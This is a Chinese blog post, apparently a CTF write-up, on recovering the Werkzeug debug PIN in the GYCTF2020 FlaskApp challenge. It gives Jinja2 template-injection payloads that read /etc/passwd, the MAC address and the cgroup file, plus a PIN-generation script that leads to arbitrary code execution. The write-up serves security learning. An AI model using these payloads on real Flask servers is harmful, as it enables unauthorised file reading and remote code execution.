@@ -1,0 +1,584 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>Flask-debug-pin安全问题学习 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Flask-debug-pin安全问题学习">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-09-18 17:54" pubdate>
+        2020年9月18日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      732 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      11
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Flask-debug-pin安全问题学习</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2020年9月18日 晚上
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id><a href="#" class="headerlink" title></a><a id="more"></a></h1><h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    在buu上刷题的时候碰到了一题**[GYCTF2020]FlaskApp**，这一题是关于Flask debug pin安全问题。通过这个问题，我们可以利用pin执行python代码执行命令。</p>
+<p>主要就是利用Flask在debug模式下会生成一个Debugger PIN</p>
+<p><img src="/2020/09/18/Flask-debug-pin%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%AD%A6%E4%B9%A0/1.png" srcset="/img/loading.gif"></p>
+<h1 id="2-参考连接"><a href="#2-参考连接" class="headerlink" title="2.参考连接"></a>2.参考连接</h1><p>具体的代码分析，我就不具体阐述了，网上有很多文章解释了</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2553">https://xz.aliyun.com/t/2553</a></p>
+<h1 id="3-利用"><a href="#3-利用" class="headerlink" title="3.利用"></a>3.利用</h1><p>我们要配合ssti注入进行文件读取来获得以下的变量值。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">username <span class="hljs-comment"># 用户名</span><br><br>modname <span class="hljs-comment"># flask.app</span><br><br><span class="hljs-built_in">getattr</span>(app, <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-built_in">getattr</span>(app.__class__, <span class="hljs-string">&#x27;__name__&#x27;</span>)) <span class="hljs-comment"># Flask</span><br><br><span class="hljs-built_in">getattr</span>(mod, <span class="hljs-string">&#x27;__file__&#x27;</span>, <span class="hljs-literal">None</span>) <span class="hljs-comment"># flask目录下的一个app.py的绝对路径</span><br><br>uuid.getnode() <span class="hljs-comment"># mac地址十进制</span><br><br>get_machine_id() <span class="hljs-comment"># /etc/machine-id</span><br></code></pre></td></tr></table></figure>
+<p>以下的参数获取都是通过ssti注入得到的。</p>
+<p>1.<strong><code>username</code>参数获取：</strong></p>
+<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;</span>想要读取的文件&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; <br></code></pre></td></tr></table></figure>
+<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;/etc/passwd&#x27;</span>, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; <br></code></pre></td></tr></table></figure>
+<p><img src="/2020/09/18/Flask-debug-pin%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%AD%A6%E4%B9%A0/2.png" srcset="/img/loading.gif"></p>
+<p>2.<strong><code>modname</code>一般是flask.app</strong></p>
+<p>3.<strong><code>getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</code>一般为<code>Flask</code></strong></p>
+<p>4.<strong>flask目录下的一个app.py的绝对路径</strong>，我们可以通过报错得到绝对路径。</p>
+<p><img src="/2020/09/18/Flask-debug-pin%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%AD%A6%E4%B9%A0/3.png" srcset="/img/loading.gif"></p>
+<p>5.<strong>uuid.getnode() # mac地址十进制</strong></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">/sys/<span class="hljs-keyword">class</span>/<span class="hljs-symbol">net</span>/<span class="hljs-symbol">eth0</span>/<span class="hljs-symbol">address</span><br>得到：<span class="hljs-symbol">02:<span class="hljs-symbol">42</span>:<span class="hljs-symbol">ae</span>:<span class="hljs-symbol">01</span>:<span class="hljs-symbol">1c</span>:<span class="hljs-symbol">6d</span></span> <br><span class="hljs-symbol">python</span>计算<span class="hljs-symbol">16</span>进制<br><span class="hljs-symbol">int</span>(&quot;<span class="hljs-symbol">0242ae011c6d</span>&quot;,<span class="hljs-symbol">16</span>)<br>转<span class="hljs-symbol">10</span>进制：<span class="hljs-symbol">2485377957891</span><br></code></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;/sys/class/net/eth0/address&#x27;</span>, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; <br></code></pre></td></tr></table></figure>
+<p><img src="/2020/09/18/Flask-debug-pin%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%AD%A6%E4%B9%A0/4.png" srcset="/img/loading.gif"></p>
+<p>6.<strong>获取machine-id</strong></p>
+<p><strong>注意在docker环境中不要读/etc/machine-id，不然算出来的PIN不对</strong></p>
+<p>payload:</p>
+<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;/proc/self/cgroup&#x27;</span>, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="/2020/09/18/Flask-debug-pin%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%AD%A6%E4%B9%A0/5.png" srcset="/img/loading.gif"></p>
+<p>接下来是用上面参考链接写的python脚本计算出pin码了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#脚本出处：https://xz.aliyun.com/t/2553</span><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;flaskweb&#x27;</span>,<span class="hljs-comment"># username</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>, <span class="hljs-comment">#modename</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>, <span class="hljs-comment"># getattr(app, &quot;\_\_name__&quot;, app.\_\_class__.\_\_name__)。</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>   <span class="hljs-comment"># 绝对路径</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;2485410405485&#x27;</span>,<span class="hljs-comment"># address   /sys/class/net/eth0/address</span><br>    <span class="hljs-string">&#x27;e71efd64605be9ae794048bb3dde190f9d2634574db620074170aa5888a7df82&#x27;</span><span class="hljs-comment"># machine-id  /proc/self/cgroup   注意在docker环境中不要读/etc/machine-id，不然算出来的PIN不对</span><br>]<br><br>h = hashlib.md5()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv =<span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br>print(rv)<br><span class="hljs-comment">#result:315-336-734</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2020/09/18/Flask-debug-pin%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%AD%A6%E4%B9%A0/6.png" srcset="/img/loading.gif"></p>
+<p>可以执行任意python代码，进而执行任意命令了。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/python%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">python安全学习</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/flask/">flask</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/09/18/BJDCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BJDCTF2020部分题目复现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/09/14/SoapClinet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96SSRF%E5%AD%A6%E4%B9%A0/">
+                        <span class="hidden-mobile">SoapClinet反序列化SSRF学习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
